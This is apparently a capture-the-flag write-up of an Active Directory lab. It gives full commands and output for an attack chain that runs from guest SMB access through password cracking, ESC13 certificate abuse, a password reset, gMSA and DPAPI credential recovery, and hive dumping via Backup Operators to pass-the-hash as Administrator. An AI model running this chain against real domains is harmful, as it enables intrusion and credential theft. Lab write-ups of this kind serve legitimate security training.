# Kitsune

Easy ad lab by xjr

![Screenshot](./image/image.png)

---

---

# -Generate hosts file

```jsx
 nxc smb 10.0.22.196 u 'Guest' -p '' --generate-hosts-file host.txt
SMB         10.0.22.196    445    DC01             [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:kitsune.local) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.0.22.196    445    DC01             [+] kitsune.local\Guest:
```

```jsx
cat host.txt               
10.0.22.196     DC01.kitsune.local kitsune.local DC01
```

# -Nmap

```jsx
└─$ nmap -sV -sC -A --min-rate 1500 10.0.22.196
Starting Nmap 7.99 ( https://nmap.org ) at 2026-11-02 12:53 +0530
Nmap scan report for DC01.kitsune.local (10.0.22.196)
Host is up (1.1s latency).
Not shown: 987 filtered tcp ports (no-response)
PORT     STATE SERVICE           VERSION
53/tcp   open  domain            Simple DNS Plus
88/tcp   open  kerberos-sec      Microsoft Windows Kerberos (server time: 2026-11-02 07:24:06Z)
135/tcp  open  msrpc             Microsoft Windows RPC
139/tcp  open  netbios-ssn       Microsoft Windows netbios-ssn
389/tcp  open  ldap              Microsoft Windows Active Directory LDAP (Domain: kitsune.local, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.kitsune.local
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.kitsune.local
| Not valid before: 2026-10-12T21:14:40
|_Not valid after:  2027-10-12T21:14:40
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap          Microsoft Windows Active Directory LDAP (Domain: kitsune.local, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.kitsune.local
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.kitsune.local
| Not valid before: 2026-10-12T21:14:40
|_Not valid after:  2027-10-12T21:14:40
3268/tcp open  ldap              Microsoft Windows Active Directory LDAP (Domain: kitsune.local, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.kitsune.local
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.kitsune.local
| Not valid before: 2026-10-12T21:14:40
|_Not valid after:  2027-10-12T21:14:40
3269/tcp open  globalcatLDAPssl?
| ssl-cert: Subject: commonName=DC01.kitsune.local
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.kitsune.local
| Not valid before: 2026-10-12T21:14:40
|_Not valid after:  2027-10-12T21:14:40
3389/tcp open  ms-wbt-server
| rdp-ntlm-info: 
|   Target_Name: KITSUNE
|   NetBIOS_Domain_Name: KITSUNE
|   NetBIOS_Computer_Name: DC01
|   DNS_Domain_Name: kitsune.local
|   DNS_Computer_Name: DC01.kitsune.local
|   DNS_Tree_Name: kitsune.local
|   Product_Version: 10.0.26100
|_  System_Time: 2026-11-02T07:29:24+00:00
| ssl-cert: Subject: commonName=DC01.kitsune.local
| Not valid before: 2026-10-11T08:21:43
|_Not valid after:  2027-04-12T08:21:43
5985/tcp open  http              Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
```

# -SMB

```jsx
nxc smb DC01.kitsune.local -u Guest -p '' --shares
```

```jsx
SMB         10.0.22.196     445    DC01             [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:kitsune.local) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.0.22.196     445    DC01             [+] kitsune.local\Guest: 
SMB         10.0.22.196     445    DC01             [*] Enumerated shares
SMB         10.0.22.196     445    DC01             Share           Permissions     Remark
SMB         10.0.22.196     445    DC01             -----           -----------     ------
SMB         10.0.22.196     445    DC01             ADMIN$                          Remote Admin
SMB         10.0.22.196     445    DC01             C$                              Default share
SMB         10.0.22.196     445    DC01             Files           READ            Global file share
SMB         10.0.22.196     445    DC01             IPC$            READ            Remote IPC
SMB         10.0.22.196     445    DC01             NETLOGON                        Logon server share 
SMB         10.0.22.196     445    DC01             SYSVOL                          Logon server share 
```

```jsx
impacket-smbclient Guest@DC01.kitsune.local -no-pass
```

```jsx
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

Type help for list of commands
# use Files
# ls
drw-rw-rw-          0  Tue Oct 13 09:38:20 2026 .
drw-rw-rw-          0  Thu Oct 15 16:19:47 2026 ..
-rw-rw-rw-       3190  Tue Oct 13 09:38:21 2026 10-11-Calendar_October.pdf
-rw-rw-rw-       4076  Tue Oct 13 09:40:23 2026 10-11-Financial_Report.pdf
-rw-rw-rw-       3854  Tue Oct 13 09:40:27 2026 10-11-Timesheet.pdf
-rw-rw-rw-        840  Tue Oct 13 08:40:05 2026 logins.psafe3
# mget *
```

-Calendar_October.pdf

![Screenshot 1](./image/image%201.png)

-Financial_Report.pdf

![Screenshot 2](./image/image%202.png)

-Timesheet.pdf

![Screenshot 3](./image/image%203.png)

-pwsafe

```jsx
pwsafe logins.psafe3
```

![Screenshot 4](./image/image%204.png)

The `logins.psafe3` file is password-protected. We can use John to crack the password.

Step1 :

```jsx
pwsafe2john logins.psafe3 > logins.hash
```

The command `pwsafe2john logins.psafe3 > logins.hash` converts the password-protected file into a hash format and saves the output to `logins.hash`.

Step2: Cracking hash using rockyou

```jsx
john --wordlist=/usr/share/wordlists/rockyou.txt logins.hash
```

```jsx
Using default input encoding: UTF-8
Loaded 1 password hash (pwsafe, Password Safe [SHA256 256/256 AVX2 8x])
Cost 1 (iteration count) is 327680 for all loaded hashes
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
hellokitty       (login)     
1g 0:00:00:38 DONE (2026-11-02 13:25) 0.02609g/s 213.7p/s 213.7c/s 213.7C/s 123456..whitetiger
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

Some usernames and passwords were found.

![Screenshot 5](./image/image%205.png)

```jsx
admin:a%KlRhqbuRgL
ranch:R@nch2026!
root:I#zmE{z[n3HM
```

Checking Ranch shares.

```jsx
nxc smb 10.0.22.196 -u 'ranch' -p 'R@nch2026!' --shares
```

```jsx
nxc smb 10.0.22.196 -u 'ranch' -p 'R@nch2026!' -d kitsune.local -M spider_plus
```

No interesting shares or folders were found.

# Colleting loot

```jsx
bloodyAD --host DC01.kitsune.local -i 10.0.22.196 -d kitsune.local -u ranch -p 'R@nch2026!' get bloodhound
```

# -ADCS

After some time, I started enumerating AD CS.

```jsx
nxc ldap 10.0.22.196 -u 'ranch' -p 'R@nch2026!' -M adcs

LDAP        10.0.22.196     389    DC01             [*] Windows 11 / Server 2025 Build 26100 (name:DC01) (domain:kitsune.local) (signing:Enforced) (channel binding:Never) 
LDAP        10.0.22.196     389    DC01             [+] kitsune.local\ranch:R@nch2026! 
ADCS        10.0.22.196     389    DC01             [*] Starting LDAP search with search filter '(objectClass=pKIEnrollmentService)'
ADCS        10.0.22.196     389    DC01             Found PKI Enrollment Server: DC01.kitsune.local
ADCS        10.0.22.196     389    DC01             Found CN: kitsune-DC01-CA
                                                                              
```

Finding vulnerable AD CS templates.

```jsx
certipy-ad find -u 'ranch@kitsune.local' -p 'R@nch2026!' -dc-host DC01.kitsune.local -dc-ip 10.0.22.196 -target DC01.kitsune.local -vulnerable -enabled -stdout 
```

```jsx
Certificate Authorities
  0
    CA Name                             : kitsune-DC01-CA
    DNS Name                            : DC01.kitsune.local
    Certificate Subject                 : CN=kitsune-DC01-CA, DC=kitsune, DC=local
    Certificate Serial Number           : 23E87814E94E648848405CFD9514BD14
    Certificate Validity Start          : 2026-10-12 21:14:31+00:00
    Certificate Validity End            : 2125-10-12 21:24:31+00:00
    Web Enrollment
      HTTP
        Enabled                         : False
      HTTPS
        Enabled                         : False
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
    Permissions
      Owner                             : KITSUNE.LOCAL\Administrators
      Access Rights
        ManageCa                        : KITSUNE.LOCAL\Administrators
                                          KITSUNE.LOCAL\Domain Admins
                                          KITSUNE.LOCAL\Enterprise Admins
        ManageCertificates              : KITSUNE.LOCAL\Administrators
                                          KITSUNE.LOCAL\Domain Admins
                                          KITSUNE.LOCAL\Enterprise Admins
        Enroll                          : KITSUNE.LOCAL\Authenticated Users
Certificate Templates
  0
    Template Name                       : Kitsune-User
    Display Name                        : Kitsune-User
    Certificate Authorities             : kitsune-DC01-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : False
    Certificate Name Flag               : SubjectAltRequireUpn
                                          SubjectRequireEmail
                                          SubjectRequireDirectoryPath
    Enrollment Flag                     : IncludeSymmetricAlgorithms
                                          PublishToDs
                                          AutoEnrollment
    Private Key Flag                    : ExportableKey
    Extended Key Usage                  : Client Authentication
                                          Secure Email
                                          Encrypting File System
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 2
    Validity Period                     : 99 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 4096
    Template Created                    : 2026-10-12T22:12:00+00:00
    Template Last Modified              : 2026-10-13T00:52:56+00:00
    Issuance Policies                   : 1.3.6.1.4.1.311.21.8.10863307.14988779.16010669.3757508.10421200.134.6077557.15214621
    Linked Groups                       : CN=HelpDesk,CN=Users,DC=kitsune,DC=local
    Permissions
      Enrollment Permissions
        Enrollment Rights               : KITSUNE.LOCAL\Domain Admins
                                          KITSUNE.LOCAL\Domain Users
                                          KITSUNE.LOCAL\Enterprise Admins
      Object Control Permissions
        Owner                           : KITSUNE.LOCAL\Administrator
        Full Control Principals         : KITSUNE.LOCAL\Domain Admins
                                          KITSUNE.LOCAL\Enterprise Admins
        Write Owner Principals          : KITSUNE.LOCAL\Domain Admins
                                          KITSUNE.LOCAL\Enterprise Admins
        Write Dacl Principals           : KITSUNE.LOCAL\Domain Admins
                                          KITSUNE.LOCAL\Enterprise Admins
        Write Property Enroll           : KITSUNE.LOCAL\Domain Admins
                                          KITSUNE.LOCAL\Domain Users
                                          KITSUNE.LOCAL\Enterprise Admins
    [+] User Enrollable Principals      : KITSUNE.LOCAL\Domain Users
    [!] Vulnerabilities
      ESC13                             : Template allows client authentication and issuance policy is linked to group 'CN=HelpDesk,CN=Users,DC=kitsune,DC=local'
```

Vulnerabilities:ESC13

ESC13 :In this case by requesting a certificate from the Kitsune-User template would give us the HelpDesk group privileges through the certificate, letting us act as if you were a member of that group.

# Requesting a certificate

```jsx
certipy-ad req -u 'ranch@kitsune.local' -p 'R@nch2026!' -dc-host DC01.kitsune.local -dc-ip 10.0.22.196  -ca 'kitsune-DC01-CA' -template 'Kitsune-User' -dc-ip 
10.0.22.196       

Certipy v5.0.4 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Request ID is 20
[-] Got error while requesting certificate: code: 0x80094811 - CERTSRV_E_KEY_LENGTH - The public key does not meet the minimum size required by the specified certificate template.
Would you like to save the private key? (y/N): y
[*] Saving private key to '20.key'
[*] Wrote private key to '20.key'
[-] Failed to request certificate
```

The error occurred because the `Kitsune-User` certificate template has a **minimum RSA key-size requirement**, while Certipy generated a default **2048-bit** RSA key.

Your template likely requires a larger key, commonly **4096 bits**. Since Certipy’s default is 2048 bits, the CA refused the request before issuing a certificate

```jsx
certipy-ad req -u 'ranch@kitsune.local' -p 'R@nch2026!' \
  -dc-host DC01.kitsune.local \
  -ca 'kitsune-DC01-CA' \
  -template 'Kitsune-User' \
  -dc-ip 10.0.22.196 \
  -key-size 4096 -debug

Certipy v5.0.4 - by Oliver Lyak (ly4k)
[+] Nameserver: '10.0.22.196'
[+] DC IP: '10.0.22.196'
[+] DC Host: 'DC01.kitsune.local'
[+] Target IP: None
[+] Remote Name: 'DC01.kitsune.local'
[+] Domain: 'KITSUNE.LOCAL'
[+] Username: 'RANCH'
[+] Trying to resolve 'DC01.kitsune.local' at '10.0.22.196'
[+] Generating RSA key
[*] Requesting certificate via RPC
[+] Trying to connect to endpoint: ncacn_np:10.0.22.196[\pipe\cert]
[+] Connected to endpoint: ncacn_np:10.0.22.196[\pipe\cert]
[*] Request ID is 22
[*] Successfully requested certificate
[*] Got certificate with UPN 'ranch@kitsune.local'
[+] Found SID in security extension: 'S-1-5-21-3773590124-4237107295-2360938966-1103'
[*] Certificate object SID is 'S-1-5-21-3773590124-4237107295-2360938966-1103'
[*] Saving certificate and private key to 'ranch.pfx'
[+] Attempting to write data to 'ranch.pfx'
[+] Data written to 'ranch.pfx'
[*] Wrote certificate and private key to 'ranch.pfx'
```

```jsx
certipy-ad auth -pfx ranch.pfx -dc-ip 10.0.22.196

Certipy v5.0.4 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'ranch@kitsune.local'
[*]     Security Extension SID: 'S-1-5-21-3773590124-4237107295-2360938966-1103'
[*] Using principal: 'ranch@kitsune.local'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'ranch.ccache'
[*] Wrote credential cache to 'ranch.ccache'
[*] Trying to retrieve NT hash for 'ranch'
[*] Got hash for 'ranch@kitsune.local': aad3b435b51404eeaad3b435b51404ee:47d29308446189faa2acec65586963c1
```

```jsx
export KRB5CCNAME="$HOME/ctf/ranch.ccache"

ls -l "$KRB5CCNAME"
```

![Screenshot 6](./image/image%206.png)

With GenericAll Over a User ,You can reset user passwords with full control over user objects.

# -Changing password

```jsx
bloodyAD --host DC01.kitsune.local -d kitsune.local -u ranch -k set password 'schlop' 'NewP@ssw0rd123!'
```

Confirming that the password has been changed

```jsx
nxc ldap 10.0.22.196 -u 'schlop' -p 'NewP@ssw0rd123!'

LDAP        10.0.22.196     389    DC01             [*] Windows 11 / Server 2025 Build 26100 (name:DC01) (domain:kitsune.local) (signing:Enforced) (channel binding:Never) 
LDAP        10.0.22.196     389    DC01             [+] kitsune.local\schlop:NewP@ssw0rd123! 
```

![Screenshot 7](./image/image%207.png)

**R**emote Management Users is a built-in Active Directory security group that lets members perform remote management of Windows systems—mainly through WinRM/WS-Management and WMI without necessarily making them full local administrators

In Simple words ,A user in **Remote Management Users** can get an interactive shell

```jsx
evil-winrm -i 10.0.22.196 -u 'schlop' -p 'NewP@ssw0rd123!'
```

The `user.txt` flag can be found in this shell.

```jsx
C:\Users\schlop\Documents> type networkAuth.cred

<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04">
  <Obj RefId="0">
    <TN RefId="0">
      <T>System.Management.Automation.PSCredential</T>
      <T>System.Object</T>
    </TN>
    <ToString>System.Management.Automation.PSCredential</ToString>
    <Props>
      <S N="UserName">pebble</S>
      <SS N="Password">01000000d08c9ddf0115d1118c7a00c04fc297eb01000000015eb4da53276741952d904a69c440310000000002000000000010660000000100002000000041903d6d7ae4fa86dd56bfe8741f4a15c9e2226d386f88f6aec7f15a5779f3e6000000000e8000000002000020000000b3604d46abd67313eb9a551d3b289c48c922bada4680807c9b7556e0633f19b920000000ae67f87d8559a61c20268cde4649e3538e0c15a7e7153c33e2fc6f7b13c713a44000000064462a2ea8ee6b2bccf09125fa86779431d4ccea0c9a30f2a325239c4199e26982ae745497a01016f90238173a2eb540b47410a39f97e8cb89c8d3ca14bcc8d7</SS>
    </Props>
  </Obj>
</Objs>
```

The password is DPAPI-protected

### -Decrypting

PowerShell can decrypt it automatically through `Import-Clixml`:

```jsx
$cred = Import-Clixml .\networkAuth.cred
$cred.UserName
$cred.GetNetworkCredential().Password

//output
pebble
PebbleIs47!
```

```jsx
pebble:PebbleIs47!

```

![Screenshot 8](./image/image%208.png)

![Screenshot 9](./image/image%209.png)

A  gMSA’s password is automatically generated and rotated by domain controllers. AD stores the current and previous password material in msDS-ManagedPassword, but returns it only to principals listed in the gMSA’s msDS-GroupMSAMembership attribute

**We can exploit this using nxc:**

```jsx
nxc ldap  10.0.22.196 -u pebble -p PebbleIs47! --gmsa

LDAP        10.0.22.196     389    DC01             [*] Windows 11 / Server 2025 Build 26100 (name:DC01) (domain:kitsune.local) (signing:Enforced) (channel binding:Never) 
LDAP        10.0.22.196     389    DC01             [+] kitsune.local\pebble:PebbleIs47! 
LDAP        10.0.22.196     389    DC01             [*] Getting GMSA Passwords
LDAP        10.0.22.196     389    DC01             Account: svc_gmsa$            NTLM: 085691c182d60ab1a12466ce7b50d29d     PrincipalsAllowedToReadPassword: IT
                                       
```

```jsx
svc_gmsa$ : 085691c182d60ab1a12466ce7b50d29d
```

```jsx
evil-winrm -i 10.0.22.196 \
  -u 'kitsune.local\svc_gmsa$' \
  -H '085691c182d60ab1a12466ce7b50d29d'
```

![Screenshot 10](./image/image%2010.png)

**Backup Operators** is a built-in Active Directory/Windows group whose members can back up and restore files even when normal file permissions would deny access. On a Domain Controller, that can lead directly to dumping every domain credential

We can exploit is using nxc

```jsx
nxc smb  DC01.kitsune.local \
  -u 'svc_gmsa$' \
  -H '085691c182d60ab1a12466ce7b50d29d'   -M backup_operator
```

```jsx
SMB         10.0.22.196    445    DC01             [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:kitsune.local) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.0.22.196    445    DC01             [+] kitsune.local\svc_gmsa$:085691c182d60ab1a12466ce7b50d29d 
BACKUP_O... 10.0.22.196    445    DC01             [*] Triggering RemoteRegistry to start through named pipe...
BACKUP_O... 10.0.22.196    445    DC01             Saved HKLM\SAM to \\10.1.219.235\SYSVOL\SAM
BACKUP_O... 10.0.22.196    445    DC01             Saved HKLM\SYSTEM to \\10.1.219.235\SYSVOL\SYSTEM
BACKUP_O... 10.0.22.196    445    DC01             Saved HKLM\SECURITY to \\10.0.22.196\SYSVOL\SECURITY
```

For some reason, it is showing an error, but the SAM, SYSTEM, and SECURITY hives are present

```jsx
BACKUP_O... 10.0.22.196    445    DC01             [-] Fail to dump the sam and lsa: [Errno 2] No such file or directory: '/home/aizen/.nxc/logs/DC01_10.1.219.235_2026-11-05_191054.SYSTEM'
BACKUP_O... 10.0.22.196    445    DC01             [*] Use the domain admin account to clean the file on the remote host
BACKUP_O... 10.0.22.196    445    DC01             [*] netexec smb dc_ip -u user -p pass -x "del C:\Windows\sysvol\sysvol\SECURITY && del C:\Windows\sysvol\sysvol\SAM && del C:\Windows\sysvol\sysvol\SYSTEM

```

Downloading SAM, SYSTEM, and SECURITY from SMB

```jsx
smbclient //DC01.kitsune.local/SYSVOL \
  -U 'kitsune.local\svc_gmsa$' \
  --pw-nt-hash
```

```jsx
smb: \> ls
  .                                   D        0  Thu Nov  5 19:11:09 2026
  ..                                  D        0  Mon Oct 12 13:50:36 2026
  kitsune.local                      Dr        0  Mon Oct 12 13:50:36 2026
  SAM                                 A    28672  Thu Nov  5 19:11:04 2026
  SECURITY                            A    36864  Thu Nov  5 19:11:09 2026
  SYSTEM                              A 19513344  Thu Nov  5 19:11:07 2026

                12974591 blocks of size 4096. 3435345 blocks available
smb: \> get SAM 
getting file \SAM of size 28672 as SAM (14.5 KiloBytes/sec) (average 14.5 KiloBytes/sec)
smb: \> get SECURITY 
getting file \SECURITY of size 36864 as SECURITY (22.0 KiloBytes/sec) (average 17.9 KiloBytes/sec)
smb: \> get SYSTEM 
parallel_read returned NT_STATUS_IO_TIMEOUT
smb: \> get SYSTEM 
NT_STATUS_IO_TIMEOUT opening remote file \SYSTEM
```

`NT_STATUS_IO_TIMEOUT` means an SMB request was sent, but the client did not receive a complete response before its timeout expired

```jsx
smbclient //DC01.kitsune.local/SYSVOL \
  -U 'kitsune.local\svc_gmsa$' \
  --pw-nt-hash \
  -t 500
```

`-t 500` sets smbclient’s **per-SMB-request timeout to 500 seconds**. The default is 20 seconds, if the server takes longer than that to respond to a read request, smbclient aborts with `NT_STATUS_IO_TIMEOUT`.

```jsx
get SYSTEM 
```

```jsx
ls -la

total 19148
drwxrwxr-x  2 aizen aizen     4096 Nov  5 19:20 .
drwx------ 27 aizen aizen     4096 Nov  5 19:32 ..
-rw-rw-r--  1 aizen aizen     4939 Nov  5 18:58 challenge_lab_kitsun.ovpn
-rw-rw-r--  1 aizen aizen     1550 Nov  5 19:06 ranch.ccache
-rw-rw-r--  1 aizen aizen     4716 Nov  5 19:00 ranch.pfx
-rw-r--r--  1 aizen aizen    28672 Nov  5 19:13 SAM
-rw-r--r--  1 aizen aizen    36864 Nov  5 19:13 SECURITY
-rw-r--r--  1 aizen aizen 19513344 Nov  5 19:24 SYSTEM
```

**Credential dumping using impacket-secretsdump**

```jsx
impacket-secretsdump \
  -sam SAM \        
  -system SYSTEM \                                    
  -security SECURITY \ 
  LOCAL 
```

```jsx
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Target system bootKey: 0x3b61a7e10112dd9303cba2228589d145
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:2dffec5d0dda0cbc8bf571471641e001:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[*] Dumping cached domain logon information (domain/username:hash)
[*] Dumping LSA Secrets
[*] $MACHINE.ACC 
$MACHINE.ACC:plain_password_hex:dec5c211d4babd91e437304c43c778d6de456ecc929c4814883425cf929e33d9eb7d6d0147c801d263a5467ccf340b2b03dcb1c83a5bad6c7ee81391acf12a9c9b4159c736d32c68e301f35a66536423d3ae3416bbde25d75d79755a63c0b4513ebcae2988d8184eb9ab4927901ec4b09e2f1bb861f06474556cff298c08e4be1d38a0b5862d90920def2e5fc1c664adad34b4f2a31f5139cdba68129fe89b70dde6aac1f3e1f818fe6b8ebc70604c27354432e8e7e7970e3f463d0f92919d58ebbd328d52a9edc1eee7cbcec9a18f0cbb718ec6a273a568c76b630a84a820a8a3f467da2f6e4a31021b03b58ccbb021
$MACHINE.ACC: aad3b435b51404eeaad3b435b51404ee:051ab8df98778de210183fd864020f45
[*] DPAPI_SYSTEM 
dpapi_machinekey:0x2d3f243818d41c56a5d560c6f9e8e8e91c63cc7e
dpapi_userkey:0xdbc4e9db99118d5c9bbfa64d0ca5c065bfa814b5
[*] NL$KM 
 0000   D6 F9 1E BE 20 95 21 6A  88 22 1F 5C 92 CE 2C 8A   .... .!j.".\..,.
 0010   BB CF 2C 38 59 53 A4 3A  EF A0 03 DA EA A5 A8 CF   ..,8YS.:........
 0020   0E 6F 91 92 02 3E 5B 45  40 E2 C7 A8 D5 DA 8B 11   .o...>[E@.......
 0030   6D 77 6B 5F 3F 78 48 12  0F BF A8 CE 06 C2 C6 7C   mwk_?xH........|
NL$KM:d6f91ebe2095216a88221f5c92ce2c8abbcf2c385953a43aefa003daeaa5a8cf0e6f9192023e5b4540e2c7a8d5da8b116d776b5f3f7848120fbfa8ce06c2c67c
[*] Cleaning up... 
```

# Shell As Administrator

```jsx
evil-winrm -i  DC01.kitsune.local \
  -u 'Administrator' \
  -H '2dffec5d0dda0cbc8bf571471641e001' 
                                        
Evil-WinRM shell v4.1
                                        
Info: Establishing connection to remote endpoint
                                        
Info: Connection successful
*Evil-WinRM* PS C:\Users\Administrator\Documents> 
```

```jsx
C:\Users\Administrator\Desktop> type "C:/Users/Administrator/Desktop/root.txt"
......................................................................
......................................................................
......................................................................
................................-%@@%-................................
.............................:%@@@@@@@@%:.............................
............................*@@@@@@@@@@@@#............................
...........................%@@@@@@@@@@@@@@@...........................
..........................@@@@@@@@@@@@@@@@@@:.........................
.........................@@@@@%#=-::-=#%@@@@@:........................
........................#@%+-=++=:..:=+++-=%@#........................
.......................=@%@@@-..:*@@#:..-@@@@@+.......................
.......................#@@@@##:::%--%:::##@@@@#.......................
.......................-@@@@+.:::....:::.+@@@@-.......................
........................:@@@@-..........-@@@@:........................
.......................-##*@@@#........#@@@*##=.......................
....................-@@@@@@%%@@@%+::+%@@@%%@@@@@@-....................
...................%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%...................
..................%@@@=------------------------=@@@%..................
.................*@@@#..........................%@@@+.................
.................@@@@@..........................@@@@@.................
................+@@@@@:..........*@@#..........:@@@@@+................
................#@@@@@=..........:@@-..........=@@@@@#................
................*@@@@@*........ranch...........*@@@@@*................
......................%.......obtained.........@......................
......................=@@@@@@@@@@@@@@@@@@@@@@@@=......................
......................................................................

HSM{13c4897877292fc104173ad41e4d166a}
```
